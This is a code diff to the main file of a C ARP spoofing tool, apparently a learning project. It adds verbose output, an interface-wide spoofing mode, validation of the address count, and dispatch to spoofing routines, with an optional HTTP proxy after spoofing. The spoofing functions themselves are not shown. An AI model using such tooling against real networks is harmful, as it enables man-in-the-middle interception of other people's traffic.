@@ -2,6 +2,62 @@
 
 t_Arguments	args;
 
+int	print_args() {
+	if (args.verbose) {
+		char	str[INET_ADDRSTRLEN];
+
+		if (inet_ntop(AF_INET, args.src_ip, str, INET_ADDRSTRLEN) == NULL) {
+			perror("inet_ntop");
+			return (1);
+		}
+
+		printf("Source IP : %s\n", str);
+
+		if (inet_ntop(AF_INET, args.tar_ip, str, INET_ADDRSTRLEN) == NULL) {
+			perror("inet_ntop");
+			return (1);
+		}
+
+		printf("Target IP : %s\n", str);
+
+		printf("Source Mac : %.02x:%.02x:%.02x:%.02x:%.02x:%.02x\n",
+			args.src_mac[0], args.src_mac[1], args.src_mac[2],
+			args.src_mac[3], args.src_mac[4], args.src_mac[5]);
+
+		printf("Target Mac : %.02x:%.02x:%.02x:%.02x:%.02x:%.02x\n",
+			args.tar_mac[0], args.tar_mac[1], args.tar_mac[2],
+			args.tar_mac[3], args.tar_mac[4], args.tar_mac[5]);
+
+		printf("\n");
+
+		printf("Attack type : ");
+		switch (args.attack_type) {
+			case REPLY_SPOOFING:
+				printf("Reply spoofing\n");
+				break ;
+			case REPLY_FLOODING:
+				printf("Reply flooding\n");
+				break ;
+			case REPLY_SPOOFING_SOLICITED:
+				printf("Reply spoofing (solicited)\n");
+				break ;
+			case REQUEST_SPOOFING:
+				printf("Request spoofing\n");
+				break ;
+			case INTERFACE_WIDE_SPOOFING:
+				printf("Interface-wide spoofing\n");
+				break ;
+		}
+
+		printf("\n");
+
+		if (args.proxy)
+			printf("HTTP communication will be proxied after spoofing\n\n");
+	}
+
+	return (0);
+}	
+
 int	parse_addr(char	*addr) {
 
 	static int	addr_index = 0;
@@ -44,8 +100,8 @@ int	parse_option(char *option) {
 		args.verbose = true;
 	} else if (strcmp(option, "-p") == 0) {
 		args.proxy = true;
-	} else if (strcmp(option, "-pp") == 0) {
-		args.proxy_listen_port = 8080;
+	} else if (strcmp(option, "-i") == 0) {
+		args.attack_type = INTERFACE_WIDE_SPOOFING;
 	} else {
 		fprintf(stderr, "Unknown option : %s\n", option);
 		return (1);
@@ -56,40 +112,31 @@ int	parse_option(char *option) {
 
 int parse_arguments(int argc, char *argv[]) {
 
+	int	adr_nb = 0;
+
 	// Setting default values for the options :
 	args.proxy = false;
 	args.verbose = false;
-	args.proxy_listen_port = 8080;
 	args.attack_type = REPLY_SPOOFING;
 
 	for (int i = 1; i < argc; i++) {
 		if (argv[i][0] == '-') {
 			if (parse_option(argv[i]) != 0)
 				return (1);
-		} else if (parse_addr(argv[i]) != 0)
-			return (1);
+		} else {
+			if (parse_addr(argv[i]) != 0)
+			 	return (1);
+			adr_nb++;
+		}
 	}
 
-	// Debugging
+	if ((args.attack_type != INTERFACE_WIDE_SPOOFING && adr_nb != 4) || (args.attack_type == INTERFACE_WIDE_SPOOFING && adr_nb != 2)) {
+		fprintf(stderr, "Invalid number of addresses provided\n");
+		return (1);
+	}
 
-	// char	str[INET_ADDRSTRLEN];
-
-	// if (inet_ntop(AF_INET, args.src_ip, str, INET_ADDRSTRLEN) == NULL) {
-	// 	perror("inet_ntop");
-	// 	return (1);
-	// }
-
-	// printf("Source IP : %s\n", str);
-
-	// if (inet_ntop(AF_INET, args.tar_ip, str, INET_ADDRSTRLEN) == NULL) {
-	// 	perror("inet_ntop");
-	// 	return (1);
-	// }
-
-	// printf("Target IP : %s\n", str);
-
-	// printf("Source Mac : %.02x:%.02x:%.02x:%.02x:%.02x:%.02x\n", args.src_mac[0], args.src_mac[1], args.src_mac[2], args.src_mac[3], args.src_mac[4], args.src_mac[5]);
-	// printf("Target Mac : %.02x:%.02x:%.02x:%.02x:%.02x:%.02x\n", args.tar_mac[0], args.tar_mac[1], args.tar_mac[2], args.tar_mac[3], args.tar_mac[4], args.tar_mac[5]);
+	if (args.verbose)
+		return print_args();
 
 	return (0);
 }
@@ -100,7 +147,7 @@ int	main(int argc, char *argv[]) {
 	// And also to send the reply packet through the same interface.
 	int	interface_index;
 
-	if (argc < 5) {
+	if (argc < 3) {
 		printf("Usage: %s [options] <source IP> <source MAC> <target IP> <target MAC>\n", argv[0]);
 		return (1);
 	}
@@ -111,20 +158,23 @@ int	main(int argc, char *argv[]) {
 	if (parse_arguments(argc, argv) != 0)
 		return (1);
 
-	// Interface validation...
-	if ((interface_index = find_interface()) == -1)
+	// Finding interface index...
+	interface_index = args.attack_type == INTERFACE_WIDE_SPOOFING ? list_interfaces() : find_interface();
+	if (interface_index < 0)
 		return (1);
 
 	// ARP spoofing...
 	if (args.attack_type == REQUEST_SPOOFING) {
 		if (arp_request_spoof(interface_index) < 0)
 			return (1);
-	}
-	else if (arp_reply_spoof(interface_index) < 0)
+	} else if (args.attack_type == INTERFACE_WIDE_SPOOFING) {
+		if (interface_spoof(interface_index) < 0)
+			return (1);
+	} else if (arp_reply_spoof(interface_index) < 0)
 		return (1);
 
-	printf("ARP spoofing attempt completed. Please check the target system to verify if the attack was successful.\n");
-	printf("The attack may be unsuccessful if the target system is not vulnerable to ARP spoofing, or if there is a race condition.\n");
+	printf("\nARP spoofing attempt completed. Please check the target system to verify if the attack was successful.\n");
+	printf("The attack may be unsuccessful if the target system is not vulnerable to ARP spoofing, or if there is a race condition.\n\n");
 
 	// HTTP proxy
 	if (args.proxy) {
